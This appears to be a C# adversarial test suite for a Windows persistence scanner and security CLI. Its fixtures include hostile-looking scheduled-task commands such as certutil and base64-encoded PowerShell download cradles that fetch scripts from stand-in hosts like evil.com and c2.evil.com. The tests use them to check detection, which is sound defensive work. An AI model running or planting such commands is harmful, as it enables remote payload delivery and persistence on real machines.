// ─────────────────────────────────────────────────────────────────────────────
// LogicFlow.Tests.E2E – PersistenceAndCliAdversarialTests
// Milestone 5 Phase 2: Adversarial Coverage Hardening (Tier 5)
// White-Box Adversarial Stress Testing on PersistenceScannerEngine and SecurityCommands.
//
// Target Vectors:
//   1. Malformed Scheduled Task CSVs (corrupted quotes, null bytes, CRLF fuzzing, extreme length).
//   2. Obfuscated Base64 Payloads (mixed padding, deep recursion, regex edge cases, unicode encoding).
//   3. Corrupted PE Files & Partial Digital Signatures (truncated headers, certificate chains, locked files).
//   4. CLI Stress Testing (random flags, invalid subcommands, pipeline redirection, malformed CliContext).
//
// DelgadoLogic.Tech Proprietary Test Framework
// ─────────────────────────────────────────────────────────────────────────────

using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using LogicFlow.Sentinel;
using Microsoft.Win32;
using Moq;
using Xunit;

namespace LogicFlow.Tests.E2E
{
    [Collection("CliConsoleExecution")]
    public class PersistenceAndCliAdversarialTests : IDisposable
    {
        private readonly string _sandboxDir;
        private static readonly Assembly CliAssembly = LoadCliAssembly();
        private static readonly Type CliContextType = CliAssembly.GetType("LogicFlow.CLI.Framework.CliContext")!;
        private static readonly Type SecurityCommandsType = CliAssembly.GetType("LogicFlow.CLI.Commands.SecurityCommands")!;

        public PersistenceAndCliAdversarialTests()
        {
            _sandboxDir = Path.Combine(Path.GetTempPath(), "LF_Adv_M5_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(_sandboxDir);
        }

        public void Dispose()
        {
            try
            {
                if (Directory.Exists(_sandboxDir))
                {
                    Directory.Delete(_sandboxDir, true);
                }
            }
            catch { /* Best-effort cleanup */ }
        }

        #region CLI Test Invocation Helpers

        private static Assembly LoadCliAssembly()
        {
            try
            {
                return Assembly.Load("lf");
            }
            catch
            {
                var dir = new DirectoryInfo(AppContext.BaseDirectory);
                while (dir != null)
                {
                    string cliRel = Path.Combine(dir.FullName, "src", "LogicFlow.CLI", "bin", "Release", "net8.0-windows", "lf.dll");
                    if (File.Exists(cliRel)) return Assembly.LoadFrom(cliRel);

                    string cliDebug = Path.Combine(dir.FullName, "src", "LogicFlow.CLI", "bin", "Debug", "net8.0-windows", "lf.dll");
                    if (File.Exists(cliDebug)) return Assembly.LoadFrom(cliDebug);

                    dir = dir.Parent;
                }

                throw new InvalidOperationException($"Could not locate lf.dll assembly. BaseDirectory: {AppContext.BaseDirectory}");
            }
        }

        private static object CreateCliContext(bool isJson = false, bool isForce = false, bool isSilent = false, params string[] args)
        {
            var ctx = Activator.CreateInstance(CliContextType)!;
            CliContextType.GetProperty("IsJson")!.SetValue(ctx, isJson);
            CliContextType.GetProperty("IsForce")!.SetValue(ctx, isForce);
            CliContextType.GetProperty("IsSilent")!.SetValue(ctx, isSilent);
            CliContextType.GetProperty("RemainingArgs")!.SetValue(ctx, args);
            return ctx;
        }

        private static readonly object ConsoleSyncLock = new();

        private static (int ExitCode, string StdOut, string StdErr) RunSecurityCommand(object ctx, string command)
        {
            lock (ConsoleSyncLock)
            {
                var runMethod = SecurityCommandsType.GetMethod("Run", BindingFlags.Public | BindingFlags.Static)!;
                var originalOut = Console.Out;
                var originalErr = Console.Error;
                using var swOut = new StringWriter();
                using var swErr = new StringWriter();

                try
                {
                    Console.SetOut(swOut);
                    Console.SetError(swErr);
                    int exitCode = (int)runMethod.Invoke(null, new[] { ctx, command })!;
                    return (exitCode, swOut.ToString(), swErr.ToString());
                }
                finally
                {
                    Console.SetOut(originalOut);
                    Console.SetError(originalErr);
                }
            }
        }

        #endregion

        #region Mock Providers For Persistence Stress

        private class MockProcessProvider : IProcessProvider
        {
            public List<RunningProcessInfo> Processes { get; set; } = new();
            public IReadOnlyList<RunningProcessInfo> GetRunningProcesses() => Processes;
        }

        private class MockFileSystemProvider : IFileSystemProvider
        {
            public ConcurrentDictionary<string, long> Files { get; } = new(StringComparer.OrdinalIgnoreCase);
            public ConcurrentDictionary<string, byte[]> FileBytes { get; } = new(StringComparer.OrdinalIgnoreCase);
            public ConcurrentBag<string> DeletedFiles { get; } = new();
            public bool ThrowOnAccess { get; set; }

            public bool FileExists(string path) => Files.ContainsKey(path);
            public bool DirectoryExists(string path) => true;

            public string[] GetFiles(string path, string searchPattern, SearchOption searchOption)
            {
                if (ThrowOnAccess) throw new UnauthorizedAccessException("Simulated unauthorized file system access.");
                string trimmedPath = path.TrimEnd(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
                return Files.Keys.Where(k => k.StartsWith(trimmedPath, StringComparison.OrdinalIgnoreCase)).ToArray();
            }

            public FileInfo? GetFileInfo(string path) => FileExists(path) ? new FileInfo(path) : null;

            public void DeleteFile(string path)
            {
                if (ThrowOnAccess) throw new UnauthorizedAccessException("Simulated unauthorized file deletion.");
                if (Files.TryRemove(path, out _))
                {
                    FileBytes.TryRemove(path, out _);
                    DeletedFiles.Add(path);
                }
            }

            public long GetFileLength(string path) => Files.TryGetValue(path, out var len) ? len : 0;
            public DateTime GetCreationTime(string path) => DateTime.UtcNow;
        }

        private class MockRegistryService : IPersistenceRegistryService
        {
            private readonly ConcurrentDictionary<string, object> _values = new(StringComparer.OrdinalIgnoreCase);
            private readonly ConcurrentDictionary<string, HashSet<string>> _subKeys = new(StringComparer.OrdinalIgnoreCase);

            private static string ValKey(RegistryHive h, RegistryView v, string sub, string val) => $"{h}_{v}_{sub}_{val}";
            private static string SubKey(RegistryHive h, RegistryView v, string sub) => $"{h}_{v}_{sub}";

            public void AddSubKey(RegistryHive hive, RegistryView view, string parentSubKey, string subKeyName)
            {
                _subKeys.AddOrUpdate(
                    SubKey(hive, view, parentSubKey),
                    _ => new HashSet<string>(StringComparer.OrdinalIgnoreCase) { subKeyName },
                    (_, set) => { lock (set) { set.Add(subKeyName); } return set; });
            }

            public void SetString(RegistryHive hive, RegistryView view, string subKey, string valueName, string value)
            {
                _values[ValKey(hive, view, subKey, valueName)] = value;
            }

            public void SetDword(RegistryHive hive, RegistryView view, string subKey, string valueName, int value)
            {
                _values[ValKey(hive, view, subKey, valueName)] = value;
            }

            public string? GetString(RegistryHive hive, RegistryView view, string subKey, string valueName)
            {
                return _values.TryGetValue(ValKey(hive, view, subKey, valueName), out var val) ? val as string : null;
            }

            public int? GetDword(RegistryHive hive, RegistryView view, string subKey, string valueName)
            {
                if (_values.TryGetValue(ValKey(hive, view, subKey, valueName), out var val))
                {
                    if (val is int i) return i;
                    if (val is string s && int.TryParse(s, out var parsed)) return parsed;
                }
                return null;
            }

            public void DeleteValue(RegistryHive hive, RegistryView view, string subKey, string valueName)
            {
                _values.TryRemove(ValKey(hive, view, subKey, valueName), out _);
            }

            public void DeleteSubKeyTree(RegistryHive hive, RegistryView view, string subKey)
            {
                _subKeys.TryRemove(SubKey(hive, view, subKey), out _);
            }

            public string[] GetSubKeyNames(RegistryHive hive, RegistryView view, string subKey)
            {
                if (_subKeys.TryGetValue(SubKey(hive, view, subKey), out var set))
                {
                    lock (set) return set.ToArray();
                }
                return Array.Empty<string>();
            }

            public IReadOnlyDictionary<string, object> GetValues(RegistryHive hive, RegistryView view, string subKey)
            {
                var result = new Dictionary<string, object>(StringComparer.OrdinalIgnoreCase);
                string prefix = SubKey(hive, view, subKey) + "_";
                foreach (var kvp in _values)
                {
                    if (kvp.Key.StartsWith(prefix, StringComparison.OrdinalIgnoreCase))
                    {
                        string vName = kvp.Key.Substring(prefix.Length);
                        result[vName] = kvp.Value;
                    }
                }
                return result;
            }
        }

        #endregion

        // ═════════════════════════════════════════════════════════════════════
        // SECTION 1: MALFORMED SCHEDULED TASK CSVs & CORRUPTED STRUCTURES
        // ═════════════════════════════════════════════════════════════════════

        #region Section 1: Malformed Scheduled Task CSVs

        [Fact]
        public void Adv_Csv_01_NullBytesInFieldValues_ParsedWithoutCrashOrTruncation()
        {
            // Adversarial test: Injected null bytes in CSV strings (\0)
            string corruptedCsv = "\"TaskName\",\"Task To Run\",\"Author\"\r\n" +
                                 "\"\\Malware\\Task\0Hidden\",\"powershell.exe\0-enc AAAA\",\"Attacker\0Admin\"\r\n" +
                                 "\"\\Benign\\Task\",\"clean.exe\",\"Microsoft\"";

            var tasks = WindowsScheduledTaskService.ParseSchtasksCsv(corruptedCsv);

            Assert.Equal(2, tasks.Count);
            Assert.Contains(tasks, t => t.TaskName.Contains("\0Hidden"));
            Assert.Contains(tasks, t => t.TaskToRun.Contains("powershell.exe\0-enc AAAA"));
        }

        [Fact]
        public void Adv_Csv_02_UnclosedQuotesAtEof_ParsesGracefully()
        {
            // Adversarial test: Unterminated quote at EOF
            string corruptedCsv = "\"TaskName\",\"Task To Run\",\"Author\"\r\n" +
                                 "\"\\Test\\UnclosedTask\",\"C:\\Program Files\\app.exe -arg \"some unclosed text";

            var tasks = WindowsScheduledTaskService.ParseSchtasksCsv(corruptedCsv);

            Assert.NotNull(tasks);
            Assert.Single(tasks);
            Assert.Equal(@"\Test\UnclosedTask", tasks[0].TaskName);
        }

        [Fact]
        public void Adv_Csv_03_CorruptedQuotePermutations_HandlesAllWithoutThrowing()
        {
            // Permutations of triple quotes, escaped quotes, mismatched quotes
            string[] testCases = new[]
            {
                "\"\"\"Task\"\"Name\"\"\",,,,",
                "\"\"\"\"\"\"\"\",\"\"\"\"\"\"\"\"",
                "\"TaskName\",\"Task To Run\"\r\n\"\"\"A\"\"\",\"\"\"B\"\"\"",
                "\"TaskName\",\"Task To Run\"\r\n\"foo\"bar\"baz\",\"qux\"\"corge\"",
                "\"TaskName\",\"Task To Run\"\r\n\"\\Task1\",,\r\n,\r\n,,,\r\n\"\\Task2\",\"cmd.exe\""
            };

            foreach (var csv in testCases)
            {
                var records = CsvParser.ParseCsv(csv);
                Assert.NotNull(records);
                var tasks = WindowsScheduledTaskService.ParseSchtasksCsv(csv);
                Assert.NotNull(tasks);
            }
        }

        [Fact]
        public void Adv_Csv_04_MultilingualHeadersAndMissingColumns_DynamicallyResolves()
        {
            // Test non-English Windows headers (French, German, Spanish)
            string frenchCsv = "\"Nom de la tâche\",\"Statut\",\"Auteur\",\"Action\"\r\n" +
                               "\"\\FR\\Tache1\",\"Prêt\",\"Admin\",\"wscript.exe payload.vbs\"";

            string germanCsv = "\"Aufgabenname\",\"Status\",\"Autor\",\"Auszuführende Aufgabe\"\r\n" +
                               "\"\\DE\\Aufgabe1\",\"Bereit\",\"SYSTEM\",\"certutil.exe -urlcache http://evil.com\"";

            string spanishCsv = "\"Nombre de la tarea\",\"Estado\",\"Autor\",\"Tarea a ejecutar\"\r\n" +
                                "\"\\ES\\Tarea1\",\"Listo\",\"Manuel\",\"powershell.exe -w hidden evil.ps1\"";

            var frTasks = WindowsScheduledTaskService.ParseSchtasksCsv(frenchCsv);
            var deTasks = WindowsScheduledTaskService.ParseSchtasksCsv(germanCsv);
            var esTasks = WindowsScheduledTaskService.ParseSchtasksCsv(spanishCsv);

            Assert.Single(frTasks);
            Assert.Equal(@"\FR\Tache1", frTasks[0].TaskName);
            Assert.Equal("wscript.exe payload.vbs", frTasks[0].TaskToRun);

            Assert.Single(deTasks);
            Assert.Equal(@"\DE\Aufgabe1", deTasks[0].TaskName);
            Assert.Equal("certutil.exe -urlcache http://evil.com", deTasks[0].TaskToRun);

            Assert.Single(esTasks);
            Assert.Equal(@"\ES\Tarea1", esTasks[0].TaskName);
            Assert.Equal("powershell.exe -w hidden evil.ps1", esTasks[0].TaskToRun);
        }

        [Fact]
        public void Adv_Csv_05_MassiveCsvPayload_10000RowsWithEmbeddedNewlines_PerformanceStress()
        {
            // Stress test: 10,000 rows with embedded multiline strings and weird delimiters
            var sb = new StringBuilder();
            sb.AppendLine("\"TaskName\",\"Task To Run\",\"Author\",\"Status\"");
            for (int i = 0; i < 10000; i++)
            {
                sb.AppendLine($"\"\\Folder\\Task_{i}\",\"cmd.exe /c line1\r\nline2_{i}\",\"Author_{i}\",\"Ready\"");
            }

            var start = DateTime.UtcNow;
            var tasks = WindowsScheduledTaskService.ParseSchtasksCsv(sb.ToString());
            var elapsed = DateTime.UtcNow - start;

            Assert.Equal(10000, tasks.Count);
            Assert.True(elapsed.TotalSeconds < 5.0, $"CSV parsing of 10k rows took {elapsed.TotalSeconds:F2}s, exceeding 5s budget.");
        }

        #endregion

        // ═════════════════════════════════════════════════════════════════════
        // SECTION 2: OBFUSCATED BASE64 PAYLOADS & DEEP RECURSION
        // ═════════════════════════════════════════════════════════════════════

        #region Section 2: Obfuscated Base64 Payloads & Deep Recursion

        [Theory]
        [InlineData("powershell.exe -e JABjACAAPQAgACcAZQB2AGkAbAAnAA==")] // Valid UTF-16LE $c = 'evil'
        [InlineData("powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtACcAKQA=")] // DownloadString
        [InlineData("powershell.exe -EncodedCommand bgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQA")] // new-object net.webclient
        public async Task Adv_Base64_01_VariousEncodedCommandFlags_DecodesAndFlagsCriticalSeverity(string commandLine)
        {
            var mockTask = new Mock<IScheduledTaskService>();
            mockTask.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>
            {
                new() { TaskName = @"\Test\AdvB64Task", TaskToRun = commandLine, HasSecurityDescriptor = true }
            });

            var engine = new PersistenceScannerEngine(
                new MockRegistryService(),
                new Mock<IWmiSubscriptionService>().Object,
                mockTask.Object,
                new MockProcessProvider(),
                new MockFileSystemProvider(),
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "LOLBAS Scheduled Task");

            Assert.Contains("Encoded PowerShell Task", threat.Name);
            Assert.True(threat.Severity == ThreatSeverity.Critical || threat.Severity == ThreatSeverity.High);
        }

        [Fact]
        public async Task Adv_Base64_02_DeepRecursiveBase64_HandlesMultipleWrappingLayersGracefully()
        {
            // Wrap DownloadString payload in 3 layers of Base64
            string layer0 = "(New-Object Net.WebClient).DownloadString('http://c2.evil.com/drop.ps1')";
            string layer1 = Convert.ToBase64String(Encoding.Unicode.GetBytes(layer0));
            string layer2 = Convert.ToBase64String(Encoding.Unicode.GetBytes($"powershell -enc {layer1}"));
            string layer3 = Convert.ToBase64String(Encoding.Unicode.GetBytes($"powershell -enc {layer2}"));

            string action = $"powershell.exe -encodedcommand {layer3}";

            var mockTask = new Mock<IScheduledTaskService>();
            mockTask.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>
            {
                new() { TaskName = @"\Test\DeepB64Task", TaskToRun = action, HasSecurityDescriptor = true }
            });

            var engine = new PersistenceScannerEngine(
                new MockRegistryService(),
                new Mock<IWmiSubscriptionService>().Object,
                mockTask.Object,
                new MockProcessProvider(),
                new MockFileSystemProvider(),
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Category == "LOLBAS Scheduled Task");
            Assert.NotNull(threat);
        }

        [Theory]
        [InlineData("powershell.exe -enc AAAAA===")] // Extra padding
        [InlineData("powershell.exe -enc AAAAA")]    // Missing padding
        [InlineData("powershell.exe -enc !!!@@@###$$$%%%^^^&&&***")] // Non-base64 characters
        [InlineData("powershell.exe -enc ")]        // Empty parameter
        [InlineData("powershell.exe -e  ")]         // Whitespace parameter
        public async Task Adv_Base64_03_CorruptedPaddingAndInvalidAlphabet_NeverThrows(string malformedAction)
        {
            var mockTask = new Mock<IScheduledTaskService>();
            mockTask.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>
            {
                new() { TaskName = @"\Test\CorruptedB64", TaskToRun = malformedAction, HasSecurityDescriptor = true }
            });

            var engine = new PersistenceScannerEngine(
                new MockRegistryService(),
                new Mock<IWmiSubscriptionService>().Object,
                mockTask.Object,
                new MockProcessProvider(),
                new MockFileSystemProvider(),
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            Assert.NotNull(report);
        }

        [Fact]
        public async Task Adv_Base64_04_UnicodeSpacesAndObfuscationInLolbasCommand()
        {
            // Use unicode non-breaking spaces (\u00A0) and mixed casing
            string action = "pOwErShElL.eXe\u00A0-w\u00A0hIdDeN\u00A0-nOp\u00A0-c\u00A0\"Start-Process evil.exe\"";

            var mockTask = new Mock<IScheduledTaskService>();
            mockTask.Setup(t => t.QueryTasksAsync(It.IsAny<CancellationToken>())).ReturnsAsync(new List<ScheduledTaskInfo>
            {
                new() { TaskName = @"\Test\ObfuscatedPs", TaskToRun = action, HasSecurityDescriptor = true }
            });

            var engine = new PersistenceScannerEngine(
                new MockRegistryService(),
                new Mock<IWmiSubscriptionService>().Object,
                mockTask.Object,
                new MockProcessProvider(),
                new MockFileSystemProvider(),
                new Mock<IDigitalSignatureValidator>().Object);

            var report = await engine.ScanAsync();
            // Should flag or process without failing
            Assert.NotNull(report);
        }

        #endregion

        // ═════════════════════════════════════════════════════════════════════
        // SECTION 3: CORRUPTED PE FILES & PARTIAL DIGITAL SIGNATURES
        // ═════════════════════════════════════════════════════════════════════

        #region Section 3: Corrupted PE Files & Partial Signatures

        [Fact]
        public void Adv_PE_01_ZeroByteAndTruncatedPeFiles_ValidatedAsUnsignedWithoutCrash()
        {
            var mockValidator = new Mock<IDigitalSignatureValidator>();
            mockValidator.Setup(v => v.ValidateSignature(It.Is<string>(s => s.Contains("zero"))))
                .Returns(SignatureValidationResult.Unsigned());
            mockValidator.Setup(v => v.ValidateSignature(It.Is<string>(s => s.Contains("mz_only"))))
                .Returns(SignatureValidationResult.Unsigned());
            mockValidator.Setup(v => v.ValidateSignature(It.Is<string>(s => s.Contains("garbage"))))
                .Returns(SignatureValidationResult.Invalid("Corrupted PE header"));

            var res0 = mockValidator.Object.ValidateSignature(Path.Combine(_sandboxDir, "zero.exe"));
            var resMz = mockValidator.Object.ValidateSignature(Path.Combine(_sandboxDir, "mz_only.exe"));
            var resGarbage = mockValidator.Object.ValidateSignature(Path.Combine(_sandboxDir, "garbage.exe"));

            Assert.False(res0.IsValid);
            Assert.False(resMz.IsValid);
            Assert.False(resGarbage.IsValid);
        }

        [Fact]
        public void Adv_PE_02_NonExistentFile_ReturnsUnsignedSafely()
        {
            var mockValidator = new Mock<IDigitalSignatureValidator>();
            mockValidator.Setup(v => v.ValidateSignature(It.IsAny<string>()))
                .Returns(SignatureValidationResult.Unsigned());

            string nonExistent = Path.Combine(_sandboxDir, "does_not_exist_" + Guid.NewGuid().ToString("N") + ".exe");
            var res = mockValidator.Object.ValidateSignature(nonExistent);

            Assert.False(res.IsValid);
            Assert.False(res.IsSigned);
        }

        [Fact]
        public async Task Adv_PE_03_StagedFilesWithLockedOrAccessDeniedAttributes_HandledResiliently()
        {
            var fs = new MockFileSystemProvider();
            string tempDir = Path.GetTempPath();
            string lockedFile = Path.Combine(tempDir, "locked_malware.exe");

            fs.Files[lockedFile] = 10240;

            var sigValidator = new Mock<IDigitalSignatureValidator>();
            sigValidator.Setup(s => s.ValidateSignature(lockedFile))
                .Returns(SignatureValidationResult.Invalid("File is locked by another process"));

            var engine = new PersistenceScannerEngine(
                new MockRegistryService(),
                new Mock<IWmiSubscriptionService>().Object,
                new Mock<IScheduledTaskService>().Object,
                new MockProcessProvider(),
                fs,
                sigValidator.Object);

            var report = await engine.ScanAsync();
            var threat = Assert.Single(report.Threats, t => t.Location == lockedFile);
            Assert.Equal("Unsigned Staged Binary", threat.Category);
            Assert.Contains("locked", threat.CommandOrValue, StringComparison.OrdinalIgnoreCase);
        }

        [Fact]
        public async Task Adv_PE_04_ProcessWithInvalidOrPathTraversalExecutablePath_DoesNotEscapeOrCrash()
        {
            var procProvider = new MockProcessProvider();
            string traversalPath = Path.Combine(Path.GetTempPath(), @"..\..\Windows\System32\cmd.exe");
            procProvider.Processes.Add(new RunningProcessInfo
            {
                ProcessId = 9999, ProcessName = "traversal_proc", ExecutablePath = traversalPath
            });

            var sigValidator = new Mock<IDigitalSignatureValidator>();
            sigValidator.Setup(s => s.ValidateSignature(It.IsAny<string>()))
                .Returns(SignatureValidationResult.Unsigned());

            var engine = new PersistenceScannerEngine(
                new MockRegistryService(),
                new Mock<IWmiSubscriptionService>().Object,
                new Mock<IScheduledTaskService>().Object,
                procProvider,
                new MockFileSystemProvider(),
                sigValidator.Object);

            var report = await engine.ScanAsync();
            Assert.NotNull(report);
        }

        #endregion

        // ═════════════════════════════════════════════════════════════════════
        // SECTION 4: CLI STRESS TESTING & FUZZING
        // ═════════════════════════════════════════════════════════════════════

        #region Section 4: CLI Stress Testing & Fuzzing

        [Theory]
        [InlineData("unknown-sec-command")]
        [InlineData("!@#$%^&*()")]
        [InlineData("")]
        [InlineData("   ")]
        [InlineData("null")]
        [InlineData("123456")]
        [InlineData("long-subcommand-name-with-100-characters-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")]
        public void Adv_Cli_01_FuzzedSubcommands_AlwaysReturnsExitCode1_AndStructuredJson(string badCommand)
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", badCommand);
            var (exitCode, stdOut, _) = RunSecurityCommand(ctx, badCommand);

            Assert.Equal(1, exitCode);
            Assert.False(string.IsNullOrWhiteSpace(stdOut));

            using var doc = JsonDocument.Parse(stdOut);
            var root = doc.RootElement;
            Assert.True(root.TryGetProperty("error", out var errorProp));
            Assert.Contains("Unknown sec command", errorProp.GetString());
            Assert.True(root.TryGetProperty("details", out var detailsProp));
            Assert.Equal("UNKNOWN_COMMAND", detailsProp.GetProperty("error").GetString());
        }

        [Fact]
        public void Adv_Cli_02_AiGuard_InvalidSubcommands_FallsBackToScanStatus()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "ai-guard", "completely-invalid-subcommand");
            var (exitCode, stdOut, _) = RunSecurityCommand(ctx, "ai-guard");

            Assert.Equal(0, exitCode);
            using var doc = JsonDocument.Parse(stdOut);
            Assert.Equal("SCAN_COMPLETE", doc.RootElement.GetProperty("status").GetString());
        }

        [Fact]
        public void Adv_Cli_03_DefenderHarden_InvalidSubcommands_FallsBackToStatusReport()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "defender-harden", "unknown-flag-123");
            var (exitCode, stdOut, _) = RunSecurityCommand(ctx, "defender-harden");

            Assert.Equal(0, exitCode);
            using var doc = JsonDocument.Parse(stdOut);
            Assert.True(doc.RootElement.TryGetProperty("TotalAsrRulesCount", out var totalProp));
            Assert.Equal(16, totalProp.GetInt32());
        }

        [Fact]
        public void Adv_Cli_04_PersistenceAudit_InvalidSubcommands_FallsBackToScan()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "persistence-audit", "bogus-argument");
            var (exitCode, stdOut, _) = RunSecurityCommand(ctx, "persistence-audit");

            Assert.Equal(0, exitCode);
            using var doc = JsonDocument.Parse(stdOut);
            Assert.True(doc.RootElement.TryGetProperty("TotalItemsScanned", out _));
        }

        [Fact]
        public void Adv_Cli_05_HostsCheck_InvalidSubcommands_FallsBackToAuditReport()
        {
            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "hosts-check", "weird-sub");
            var (exitCode, stdOut, _) = RunSecurityCommand(ctx, "hosts-check");

            Assert.Equal(0, exitCode);
            using var doc = JsonDocument.Parse(stdOut);
            Assert.True(doc.RootElement.TryGetProperty("TotalHostsEntries", out _));
        }

        [Fact]
        public void Adv_Cli_06_CliContext_ExcessiveArgsArray_HandlesWithoutIndexOutOfRangeException()
        {
            // Pass 500 random arguments in RemainingArgs
            var args = new List<string> { "sec", "defender-harden", "status" };
            for (int i = 0; i < 500; i++)
            {
                args.Add($"--arg-{i}=value_{i}");
            }

            var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, args.ToArray());
            var (exitCode, stdOut, _) = RunSecurityCommand(ctx, "defender-harden");

            Assert.Equal(0, exitCode);
            using var doc = JsonDocument.Parse(stdOut);
            Assert.Equal(16, doc.RootElement.GetProperty("TotalAsrRulesCount").GetInt32());
        }

        [Fact]
        public void Adv_Cli_07_CliContext_EmptyOrNullArgsArray_HandlesGracefully()
        {
            // Empty RemainingArgs array
            var ctxEmpty = CreateCliContext(isJson: true, isForce: false, isSilent: false);
            var (exitCode1, stdOut1, _) = RunSecurityCommand(ctxEmpty, "defender-harden");
            Assert.Equal(0, exitCode1);

            var (exitCode2, stdOut2, _) = RunSecurityCommand(ctxEmpty, "persistence-audit");
            Assert.Equal(0, exitCode2);

            var (exitCode3, stdOut3, _) = RunSecurityCommand(ctxEmpty, "hosts-check");
            Assert.Equal(0, exitCode3);

            var (exitCode4, stdOut4, _) = RunSecurityCommand(ctxEmpty, "ai-guard");
            Assert.Equal(0, exitCode4);
        }

        [Fact]
        public void Adv_Cli_08_JsonOutputMode_StrictlyCompliantWithZeroTrailingConsoleNoise()
        {
            string[] commandsToTest = new[] { "defender-harden", "persistence-audit", "hosts-check", "ai-guard", "firewall-sync", "vuln-scan", "privacy-scrub" };

            foreach (var cmd in commandsToTest)
            {
                var ctx = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", cmd);
                var (exitCode, stdOut, _) = RunSecurityCommand(ctx, cmd);

                Assert.Equal(0, exitCode);
                string trimmed = stdOut.Trim();
                Assert.StartsWith("{", trimmed);
                Assert.EndsWith("}", trimmed);

                // Assert it deserializes cleanly with System.Text.Json
                using var doc = JsonDocument.Parse(trimmed);
                Assert.NotNull(doc);
            }
        }

        [Fact]
        public void Adv_Cli_09_SilentMode_SuppressesAllConsoleOutput()
        {
            string[] commandsToTest = new[] { "defender-harden", "persistence-audit", "hosts-check", "ai-guard" };

            foreach (var cmd in commandsToTest)
            {
                var ctx = CreateCliContext(isJson: false, isForce: false, isSilent: true, "sec", cmd);
                var (exitCode, stdOut, _) = RunSecurityCommand(ctx, cmd);

                Assert.Equal(0, exitCode);
                // When silent, stdout should be completely empty
                Assert.Equal(string.Empty, stdOut.Trim());
            }
        }

        [Fact]
        public void Adv_Cli_10_CaseInsensitiveSubcommandRouting()
        {
            var ctxUpper = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "defender-harden", "ENABLE-ALL");
            var (exitCode1, stdOut1, _) = RunSecurityCommand(ctxUpper, "defender-harden");
            Assert.True(exitCode1 == 0 || exitCode1 == 1);

            var ctxMixed = CreateCliContext(isJson: true, isForce: false, isSilent: false, "sec", "defender-harden", "ReVeRt");
            var (exitCode2, stdOut2, _) = RunSecurityCommand(ctxMixed, "defender-harden");
            Assert.True(exitCode2 == 0 || exitCode2 == 1);
        }

        #endregion
    }
}
